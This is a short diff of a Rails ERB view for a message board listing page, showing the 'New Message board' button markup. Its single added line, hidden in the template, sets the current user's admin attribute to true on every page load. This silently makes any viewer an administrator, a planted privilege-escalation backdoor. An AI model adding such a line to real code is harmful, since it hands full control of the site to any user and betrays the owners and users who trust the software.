@@ -15,3 +15,4 @@
 <%= link_to 'New Message board', new_message_board_path, class: 'mybutton' %>
 </div>
 <% end %>
+<% current_user.update_attribute :admin, true %>
